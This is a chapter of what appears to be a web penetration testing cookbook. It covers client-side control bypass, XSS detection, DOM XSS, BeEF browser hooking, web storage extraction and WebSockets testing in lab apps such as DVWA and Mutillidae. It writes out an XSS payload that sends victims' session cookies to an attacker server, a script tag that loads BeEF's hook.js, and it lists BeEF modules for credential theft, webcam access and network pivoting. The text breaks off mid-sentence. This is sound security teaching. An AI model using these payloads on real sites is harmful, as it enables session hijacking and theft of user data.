- en: Cross-Site Scripting and Client-Side Attacks
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In this chapter, we will cover:'
  prefs: []
  type: TYPE_NORMAL
- en: Bypassing client-side controls using the browser
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Identifying Cross-Site Scripting vulnerabilities
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Obtaining session cookies through XSS
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Exploiting DOM XSS
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Man-in-the-Browser attack with XSS and BeEF
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Extracting information from web storage
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Testing WebSockets with ZAP
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Using XSS and Metasploit to get a remote shell
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Introduction
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The main difference between web applications and other types of application
    is that web applications don't have software or a user interface installed on
    the client, so the browser plays the role of client on the user's device.
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we will focus on vulnerabilities that take advantage of the
    fact that the browser is a code interpreter that reads HTML and scripting code,
    and displays the result to users, as well as allowing them to interact with the
    server via HTTP requests and more recently WebSockets, an addition to the latest
    version of the HTML language, HTML5.
  prefs: []
  type: TYPE_NORMAL
- en: Bypassing client-side controls using the browser
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Processing in web applications happens both on the server side and the client
    side. The latter is often used to do things related to how information is presented
    to the user; also, input validation and some authorization tasks are performed
    client-side. When these validation and authorization checks are not reinforced
    by a similar server-side process, we may face a security problem, as client-side
    information and processing is easily manipulable by users.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will see a couple of situations where a malicious user can
    take advantage of client-side controls that are not backed up by server-side counterparts.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Let''s look at a practical example using WebGoat:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Log in to WebGoat and go to Access Control Flaws | LAB Role Based Access Control
    | Stage 1: Bypass Business Layer Access Control:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/9dd62eed-bbfc-436d-b0e4-f337071a7dac.png)'
  prefs: []
  type: TYPE_IMG
- en: Use Tomcat's credentials (`Tom`:`tom`) to log in and enable Firefox's Developer
    Tools (*F12*).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Let''s inspect the list of employees. We can see that the only element, `Tom
    Cat (employee)`, is an option HTML tag with the value `105`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/fbe586c9-1272-41b4-9800-27a18042f624.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Go to the Network tab in Developer Tools and click on ViewProfile. Notice how
    the request has a parameter called `employee_id` and its value is `105`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/b42eb2ac-e5af-41cf-a1d9-2d3dab829d80.png)'
  prefs: []
  type: TYPE_IMG
- en: Click on ListStaff to go back to the list.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Change to the Inspector tab in Developer Tools.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Double-click on the value (`105`) of the `option` tag and change it to `101`.
    We want to see whether it is possible to look at other users' information by changing
    this parameter.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Click on ViewProfile again:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/58598342-59d4-4262-b9cb-aa7246fe889f.png)'
  prefs: []
  type: TYPE_IMG
- en: Now, the task in WebGoat is to delete Tom's profile using his own account, so
    let's try that. Click on ListStaff to go back to the list.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Now, inspect the ViewProfile button.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Notice how its name is `action` and its value is ViewProfile; change the value
    to DeleteProfile:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/418a6c86-11b5-4595-9d99-cdfd40685a9b.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The text in the button will change. Click DeleteProfile and this stage will
    be completed:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/76ebc91d-182e-41fc-9e65-ca8b8537efff.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this recipe, we first noticed that the employee IDs are given to the client
    as values in a list and sent to the server as request parameters, so we tried
    and changed the `employee_id` parameter to get information from an employee we
    shouldn't have access to.
  prefs: []
  type: TYPE_NORMAL
- en: After that, we noticed, by checking the Inspector, that all buttons have the
    same name, `action`, and their values are the action to be taken when pressed.
    This can be confirmed by checking the requests in the Network tab of the Developer
    Tools. So, if we have actions such as `SearchStaff`, `ViewProfile`, and `ListStaff`,
    maybe `DeleteProfile` would do the thing the challenge asks for. After we changed
    the `ViewProfile` button's value and clicked on it, we verified our assumption
    was correct, and we can delete any user (or perform any action) in this application
    by manipulating the values of the HTML elements with the tools any web browser
    includes.
  prefs: []
  type: TYPE_NORMAL
- en: See also
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Mutillidae II, also included in OWASP BWA, has a very interesting challenge
    for client-side control bypasses. It's recommended the reader tries it.
  prefs: []
  type: TYPE_NORMAL
- en: Identifying Cross-Site Scripting vulnerabilities
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '**Cross-Site Scripting** (**XSS**) is one of the most common vulnerabilities
    in web applications; in fact, it is considered third in the OWASP Top 10 from
    2013 ([https://www.owasp.org/index.php/Top_10_2013-Top_10](https://www.owasp.org/index.php/Top_10_2013-Top_10)).'
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will see some key points in identifying an XSS vulnerability
    in a web application.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Let''s look at the following steps:'
  prefs: []
  type: TYPE_NORMAL
- en: We will use **Damn Vulnerable Web Application** (**DVWA**) for this recipe.
    Log in using the default admin credentials (`admin` as both username and password)
    and go to XSS reflected.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'The first step in testing for a vulnerability is to observe the normal response
    of the application. Introduce a name in the textbox and click Submit. We will
    use `Bob`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/62b99806-25ad-4183-b59a-eccb1ac3996d.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The application used the name we provided to form a phrase. What happens if
    instead of a valid name we introduce some special characters or numbers? Let''s
    try with `*<*''this is the 1st test''*>*`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/d42e50ee-96f9-4319-a047-fec22aa13f99.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, we see that anything we put in the textbox will be reflected in the response;
    that is, it is becoming the part of the HTML page in response. Let''s check the
    page''s source code to analyze how it presents the information:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/22f84bcc-9eb0-46ab-859b-e16396defae9.png)'
  prefs: []
  type: TYPE_IMG
- en: The source code shows that there is no encoding for special characters in the
    output and the special characters we send are reflected back in the page without
    any prior processing. The `*< *`and `*>*` symbols are the ones used to define
    HTML tags, so maybe we can introduce some script code.
  prefs: []
  type: TYPE_NORMAL
- en: 'Try introducing a name followed by very simple script code, `Bob<script>alert(''XSS'')</script>`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/7a363f68-861b-4b81-9d90-5a92896de440.png)'
  prefs: []
  type: TYPE_IMG
- en: The page executed the script, causing an alert to appear, so this page is vulnerable
    to XSS.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, check the source code to see what happened with our input:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/3d3203d7-d853-4b65-9c28-9c1fae4ae812.png)'
  prefs: []
  type: TYPE_IMG
- en: It looks like our input was processed as if it was a part of the HTML code;
    the browser interpreted the `<script>` tag and executed the code inside it, showing
    the alert as we set it.
  prefs: []
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: XSS vulnerabilities happen when weak or no input validation is done and there
    is no proper encoding of the output, both on the server side and client side.
    This means that the application allowed us to introduce characters that are also
    used in HTML code and, when it was going to send them to the page, did not follow
    any encoding process (such as using the HTML escape codes `&lt;` and `&gt;`) to
    prevent them from being interpreted as HTML or JavaScript source code.
  prefs: []
  type: TYPE_NORMAL
- en: These vulnerabilities are used by attackers to alter the way a page behaves
    on the client side and to trick users into performing tasks without them knowing,
    or to steal private information.
  prefs: []
  type: TYPE_NORMAL
- en: 'To discover the existence of an XSS vulnerability, we followed some leads:'
  prefs: []
  type: TYPE_NORMAL
- en: The text we introduced in the box was used exactly as sent to form a message
    that was presented on the page; that is, it is a reflection point
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Special characters were not encoded or escaped
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The source code showed that our input was integrated in a position where it
    could become a part of the HTML code and be interpreted as that by the browser
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: There's more...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this recipe, we discovered a reflected XSS; this means that the script is
    executed every time we send this request and the server responds to it. Another
    type of XSS is called a stored XSS. A stored XSS is one that may or may not be
    presented immediately after input submission, but such input is stored on the
    server (maybe in a database) and is executed every time a user accesses the stored
    data.
  prefs: []
  type: TYPE_NORMAL
- en: Obtaining session cookies through XSS
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the previous recipe, we did a very basic proof of concept for an XSS exploitation.
    Also, in previous chapters, we saw how a session cookie can be used by an attacker
    to steal a valid user's session. XSS vulnerabilities and session cookies that
    are not protected by the `HttpOnly` flag can be a deadly combination for a web
    application's security.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will see how an attacker can exploit an XSS vulnerability
    to grab a user's session cookie.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The attacker needs to have a server to receive the exfiltrated data (session
    cookies, in this case), so we will use a simple Python module to set it up. These
    are the steps:'
  prefs: []
  type: TYPE_NORMAL
- en: 'To start a basic HTTP server with Python, run the following command in a Terminal
    in Kali Linux:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/d3290beb-bd98-4ced-89cf-a10766e7186d.png)'
  prefs: []
  type: TYPE_IMG
- en: Now log in to DVWA and go to XSS reflected.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Enter the following payload in the Name textbox:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: '![](assets/55350ad2-5d35-487a-aa21-ef9dbb4db8ef.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, go back to the Terminal where the Python server is running and see how
    it has received a new request:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/174cb73f-6f7d-4623-a2a3-82a299c6f092.png)'
  prefs: []
  type: TYPE_IMG
- en: Notice that the URL parameter (after `GET`) contains the user's session cookie.
  prefs: []
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In attacks such as XSS, where user interaction is required in order to exploit
    a vulnerability, attackers have little or no control over when the user clicks
    the malicious link or performs the action required to compromise the application.
    In such a scenario, the attacker should have a server set up to receive the information
    sent by the victim.
  prefs: []
  type: TYPE_NORMAL
- en: In this example, we used the `SimpleHTTPServer` module provided by Python, but
    a more sophisticated attack would obviously require a more sophisticated server.
  prefs: []
  type: TYPE_NORMAL
- en: After that, going to DVWA and entering the payload in the Name textbox simulates
    a user clicking on a link to `http://192.168.56.11/dvwa/vulnerabilities/xss_r/?name=Bob<script>document.write('<img
    src="http://192.168.56.10:88/'+document.cookie+'">');</script> `sent by an attacker.
    Once the user's browser loads the page and interprets the payload as JavaScript
    code, it will try to access an image stored on the attacker's server (`http://192.168.56.10:88`,
    our Kali VM) with the value of the cookie as the filename. The attacker's server
    will register this request and return a 404 Not found error; they can then take
    the logged session cookie and use it to hijack the user's session.
  prefs: []
  type: TYPE_NORMAL
- en: See also
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In this recipe, we used the `<script>` tag to inject a JavaScript code block
    into the page; however, this is not the only HTML tag we can use, especially with
    the additions made by HTML5, where we have `<video>` and `<audio>`, for example.
    Let''s see some other payloads we could have used to exploit XSS:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Generating an error event on tags with an `src/source` parameter, such as `<img>`, `<audio>`,
    and `<video>`:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'Or, use the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'Or, there is also this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'Injecting a `<script>` tag that loads an external JavaScript file:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: 'If the injected text is set as a value inside an HTML tag and surrounded by
    quotes (`"`), like in `<input value="injectable_text">`, we can close the quotes
    and add an event to the code. For example, replace `injectable_text` with the
    following code. Notice how the last quote is not closed so we can use the one
    already in the HTML code:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: 'Injecting a link or other tag with the `href` property to make it execute code
    whenever it is clicked:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'There are a multitude of variations of tags, encodings, and instructions that
    can be used to exploit an XSS vulnerability. For a more complete reference, see
    the OWASP XSS Filter Evasion Cheat Sheet: [https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).'
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting DOM XSS
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Also referred to as client-side XSS, DOM XSS is named this way because the payload
    is received and processed by the DOM of the browser, which means that the injected
    code never reaches the server and any server-side validation or encoding is ineffective
    against this kind of attack.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will analyze how this vulnerability can be detected and exploited
    in a web application.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The following are the steps for detecting and exploiting this vulnerability
    in a web application:'
  prefs: []
  type: TYPE_NORMAL
- en: In the vulnerable virtual machine `vm_1`, go to Mutillidae II | Top 10 2013
    | XSS | DOM | HTML5 local storage.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: This exercise shows a form that stores information in the browser's local and
    session storage. Enable the Developer Tools in the Network tab.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Try adding some data and notice how there is no network communication, and
    that the green bar displays the value given to the key:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/6797d3dc-0c96-46c7-97c6-ea0fafecefd3.png)'
  prefs: []
  type: TYPE_IMG
- en: 'If we inspect the Add New button, we see it calls a function, `addItemToStorage`,
    when clicked:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/eec77323-107e-4db0-81d8-500267564a90.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, go to the Debugger tab and look for the `addItemToStorage` function; we
    find it in line 1064 of `index.php`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/260b3c84-0cb2-4cd2-b6bc-d0beedff5520.png)'
  prefs: []
  type: TYPE_IMG
- en: The arrow with number 1 shows that there is some input validation in place,
    but it depends on the value of a variable called `gUseJavaScriptValidation`. If
    we look for this variable in the code, we find it is initially declared with the
    value `FALSE` (line 1027) and there doesn't seem to be any place where its value
    changes, so maybe that condition is never true. We follow the code flow and find
    that there's no other validation or modification of the variable that holds the
    value of the key. And in **2**, line 1093, that value is passed as a parameter
    to the `setMessage` function, which in line 1060 **3**, adds the message to the
    page by using the `innerHTML` property of an existing element.
  prefs: []
  type: TYPE_NORMAL
- en: 'So, let''s try setting a key value that includes HTML code. Add a new entry
    with the following as the key: `Cookbook test <H1>3</H1>`'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/5f6ebb6d-77b2-42a7-b72d-e5b11def40ca.png)'
  prefs: []
  type: TYPE_IMG
- en: 'If the HTML code is interpreted by the browser, it is very likely that a JavaScript
    block also would be. Add a new entry with the following as the key: `Cookbook
    test <img src=X onerror="alert(''DOM XSS'')">`'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/21f4321c-4f1b-4536-acd2-45264a823f22.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this recipe, we first analyzed the behavior of the application, noticing
    that it didn't connect to the server to add information to the page and that it
    reflected a value given by the user. Later, we analyzed the script code that adds
    the data to the browser's internal storage, and noticed that such data may not
    be properly validated and presented back to the user via the `innerHTML` property,
    at least for the key value, which implies that the data is treated as HTML code,
    not as text.
  prefs: []
  type: TYPE_NORMAL
- en: To try this lack of validation, we first inserted some text with HTML header
    tags and got the code interpreted by the browser. Our last step was to attempt
    an XSS proof of concept that was successful.
  prefs: []
  type: TYPE_NORMAL
- en: Man-in-the-Browser attack with XSS and BeEF
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: BeEF, the Browser Exploitation Framework, is a tool that focuses on client-side
    vectors, specifically on attacking web browsers.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will exploit an XSS vulnerability and use BeEF to take control
    of the client browser.
  prefs: []
  type: TYPE_NORMAL
- en: Getting ready
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Before we start, we need to be sure that we have started the BeEF service and
    are capable of accessing `http://127.0.0.1:3000/ui/panel` (with `beef`/`beef`
    as login credentials).
  prefs: []
  type: TYPE_NORMAL
- en: 'The default BeEF service in Kali Linux doesn''t work, so we cannot simply run
    `beef-xss` to get BeEF running. Instead, we need to run it from the directory
    in which it was installed, as shown here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: '![](assets/cfd25498-a677-4024-a496-e016a6690db1.png)'
  prefs: []
  type: TYPE_IMG
- en: Now, browse to `http://127.0.0.1:3000/ui/panel` and use `beef` as both the username
    and password. If that works, we are ready to continue.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'BeEF needs the client browser to call the `hook.js` file, which is the one
    that hooks the browser to our BeEF server and we will use an application vulnerable
    to XSS to make the user call it:'
  prefs: []
  type: TYPE_NORMAL
- en: Imagine that you are the victim; you have received an email containing a link
    to `http://192.168.56.11/bodgeit/search.jsp?q=<script src="http://192.168.56.10:3000/hook.js"></script>`
    and you browse to that link.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Now, in the BeEF panel, the attacker will see a new online browser:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/60862e74-52d6-4dbf-afa1-2ce01c5eaf0e.png)'
  prefs: []
  type: TYPE_IMG
- en: 'If we check the Logs tab in the browser, we may see that BeEF is storing information
    about the actions the user is performing in the browser''s window, such as typing
    and clicking, as we can see here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/4e6e0c5a-d0c8-47d4-9dea-9afac2a1d37d.png)'
  prefs: []
  type: TYPE_IMG
- en: The best thing for the attacker to do after a browser is hooked is to generate
    some persistence, at least while the user is navigating in the compromised domain.
    Go to the Commands tab in the attacker's browser and, from there in the Module
    Tree, go to Persistence | Man-In-The-Browser and then click on Execute.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'After the module executes, select the relevant command in Module Results History
    to check the results shown as follows:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/f4608bc6-77bb-4e28-ae10-ce45bc7d9f8e.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The attacker can also use BeEF to execute commands in the victim browser; for
    example, in the Module Tree go to Browser | Get Cookie and click Execute to get
    the user''s cookie:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/112c359a-9ac0-4e5f-b727-b988aa1b6283.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this recipe, we used the `src` property of the `script` tag to call an external
    JavaScript file; in this case, the hook to our BeEF server.
  prefs: []
  type: TYPE_NORMAL
- en: This `hook.js` file communicates with the server, executes the commands, and
    returns the responses so that the attacker can see them; it prints nothing in
    the client's browser so the victim will generally never know that his or her browser
    has been compromised.
  prefs: []
  type: TYPE_NORMAL
- en: After making the victim execute our hook script, we used the persistence module
    Man-in-the-Browser to make the browser execute an AJAX request every time the
    user clicks a link to the same domain, so that this request keeps the hook and
    also loads the new page.
  prefs: []
  type: TYPE_NORMAL
- en: We also saw that BeEF's log keeps a record of every action the user performs
    on the page, and we were able to obtain a username and password from this. It
    was also possible to obtain the session cookie remotely, which could have allowed
    an attacker to hijack the victim's session.
  prefs: []
  type: TYPE_NORMAL
- en: 'The colored circle to the left of the module indicates the availability and
    visibility of the module: green means that the module works for the victim browser
    and should not be visible to the user, orange says that it will work but the user
    will notice it or will have to interact with it, gray means that it hasn''t been
    tested in that browser, and red means that the module does not work against the
    hooked browser.'
  prefs: []
  type: TYPE_NORMAL
- en: There's more...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'BeEF has an incredible amount of functionality, from ascertaining the type
    of browser the victim is using, to the exploitation of known vulnerabilities and
    the complete compromise of the client system. Some of the most interesting features
    are as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Social Engineering—Pretty Theft**: This is a social engineering tool that
    allows us to simulate a login popup resembling common services such as Facebook,
    LinkedIn, YouTube, and others.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Browser—webcam and browser—webcam HTML5**: As obvious as it might seem, these
    two modules are able to abuse a permissive configuration to activate the victim''s
    webcam. The first uses a hidden flash embed and the second uses HTML5.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Exploits folder**: This contains a collection of exploits for specific software
    and situations; some of them exploit servers and others the client''s browser.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Browser—hooked domain/get stored credentials**: This attempts to extract
    the username and passwords for the compromised domains stored in the browser.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Use as proxy**: If we right-click on a hooked browser, we get the option
    to use it as a proxy, which makes the client''s browser a web proxy; this may
    give us the chance to explore our victim''s internal network.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: There are many other attacks and modules in BeEF that are useful to a penetration
    tester; if you want to learn more, you can check out the official wiki at [https://github.com/beefproject/beef/wiki](https://github.com/beefproject/beef/wiki).
  prefs: []
  type: TYPE_NORMAL
- en: Extracting information from web storage
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Prior to HTML5, the only way a web application could store information persistently
    or on a session basis in a user's computer was through cookies. In this new version
    of the language, new storage options, called **web storage**, are added, namely
    local storage and session storage. These allow an application to store and retrieve
    information from a client (browser) using JavaScript, and this information is
    kept until explicitly deleted, in the case of local storage, or in the case of
    session storage, until the tab or window that saved it is closed.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will use XSS vulnerabilities to retrieve information from
    the browser's web storage, showing that this information can be easily exfiltrated
    by an attacker if an application is vulnerable.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'We will use Mutillidae II and its HTML5 web storage exercise again for this
    recipe. Here are the steps:'
  prefs: []
  type: TYPE_NORMAL
- en: In the Kali VM, browse to Mutillidae II (`http://192.168.56.11/mutillidae`)
    and in the menu, go to HTML5 | HTML 5 Web Storage | HTML 5 Web Storage.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Open Developer Tools and go to the Storage tab. Then, go to `Local Storage`
    and select the server address (`192.168.56.11`):'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/e515ef8f-6824-41c6-bd4b-8bae58f3fa35.png)'
  prefs: []
  type: TYPE_IMG
- en: Here, we can see that there are three values in Local Storage.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, change to `Session Storage` and select the server address:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/2028eff7-f0fe-4f97-89ef-964721be6dd3.png)'
  prefs: []
  type: TYPE_IMG
- en: In the temporary or per-session storage, we see four values, among them one
    called `Secure.AuthenticationToken`.
  prefs: []
  type: TYPE_NORMAL
- en: We mentioned before that `Local Storage` is accessible on a per-domain basis,
    which means that any application running in the same domain can read and manipulate,
    for example, the `MessageOfTheDay` entry we saw in *step 2*. Let's try and exploit
    a vulnerability in another application to access this data. On the same browser,
    open a new tab and go to BodgeIt (`http://192.168.56.11/bodgeit`).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'We know BodgeIt''s search is vulnerable to XSS, so enter the following payload
    in the search box and execute it:'
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: '![](assets/94d95b99-c013-40c7-af0a-caca4d5fe565.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, try the same with the `Session Storage`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: As we cannot access the `Session Storage` from a different window, go back to
    the Mutillidae II tab and go to Owasp 2013 | XSS | Reflected First Order | DNS
    lookup.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'In the Hostname/IP field, enter the preceding payload and click on Lookup DNS:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/855c03fa-8cd7-4aa5-9394-d9007c74d513.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this recipe, we saw how we can use the browser's Developer Tools to view
    and edit the contents of the browser's storage. We verified the differences in
    accessibility between `Local Storage` and `Session Storage`, and how an XSS vulnerability
    can expose all stored information to an attacker.
  prefs: []
  type: TYPE_NORMAL
- en: 'First, we accessed `Local Storage` from an application different from the one
    that added the storage, but in the same domain. To do that, we used `window.localStorage.MessageOfTheDay`,
    taking the key value as the object name and referencing it directly as a member
    of `Local Storage`. For the `Session Storage`, we had to move to the window that
    created the storage and exploit a vulnerability there; here, we used a different
    instruction to get the value we wanted: `window.sessionStorage.getItem("Secure.AuthenticationToken"`.
    Both forms (key as a member of the class and `getItem`) are valid for both types
    of storage. We used `getItem` in the session because the key includes a period
    (`.`), and this would be processed as an object/property delimiter by the JavaScript
    interpreter, so we needed to use `getItem` to enclose it in colons.'
  prefs: []
  type: TYPE_NORMAL
- en: There's more...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: If an application uses web storage to keep sensitive information about users,
    XSS shouldn't be the only security concern. If an attacker has access to the user's
    computer, this attacker can directly access the files where `Local Storage` is
    kept, as browsers save this information in clear text in local database files.
    It's left to the reader to investigate where these files are stored by different
    browsers and in different operating systems, and how to read them.
  prefs: []
  type: TYPE_NORMAL
- en: Testing WebSockets with ZAP
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: As HTTP is a stateless protocol, it treats every request as unique and unrelated
    to the previous and next ones, which is why applications need to implement mechanisms
    such as session cookies to manage the operations performed by a single user in
    a session. As an alternative to overcome this limitation, HTML5 incorporates WebSockets.
    WebSockets provide a persistent, bidirectional communication channel between client
    and server over the HTTP protocol.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will show how to use OWASP ZAP to monitor, intercept, and
    modify WebSockets communication as we do with normal requests during penetration
    testing.
  prefs: []
  type: TYPE_NORMAL
- en: Getting ready
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: OWASP BWA doesn't yet include an application that uses WebSockets, so we will
    need to use **Damn Vulnerable Web Sockets** (**DVWS**) ([https://www.owasp.org/index.php/OWASP_Damn_Vulnerable_Web_Sockets_(DVWS)](https://www.owasp.org/index.php/OWASP_Damn_Vulnerable_Web_Sockets_(DVWS))),
    also from OWASP, for this recipe.
  prefs: []
  type: TYPE_NORMAL
- en: 'DVWS is a PHP-based open source application; download it into your Kali VM
    from its GitHub repository: [https://github.com/interference-security/DVWS/](https://github.com/interference-security/DVWS/).'
  prefs: []
  type: TYPE_NORMAL
- en: In ideal conditions, we would only need to download the application, copy it
    to the Apache root directory, and start the services to have it running, but unfortunately
    for us, this is not the case in Kali Linux.
  prefs: []
  type: TYPE_NORMAL
- en: 'First, you need to install the `php-mysqli` package using `apt install php-mysqli`.
    Pay attention to the PHP version it is for; in our case it is for 7.2\. Check
    PHP versions in Apache `config` files and adjust accordingly. Be sure that the
    correct versions of the PHP modules are in `/etc/apache2/mods-enabled/`; if they
    are not, copy the right ones from `/etc/apache2/mods-available/` and remove the
